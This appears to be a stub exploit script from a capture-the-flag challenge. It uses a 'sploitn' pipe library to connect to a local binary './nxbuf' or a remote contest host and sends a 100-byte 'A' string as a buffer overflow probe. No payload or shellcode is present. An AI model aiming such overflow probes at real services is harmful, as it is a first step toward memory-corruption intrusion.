from sploitn import LocalPipe
from sploitn import RemotePipe
def main(argv):
    if '-l' in argv:
        expl = LocalPipe('./nxbuf', debug=True)
        expl.interact()

    else:
        expl = RemotePipe('9447.hack.sydney', 9001, debug=True)
        expl.read_until()
        expl.read_until()
        expl.send('A' * 100 + '\r\n')
        expl.read_until()

    # expl.read_until()
    # expl.read_until()



if __name__ == '__main__':
    import sys
    main(sys.argv)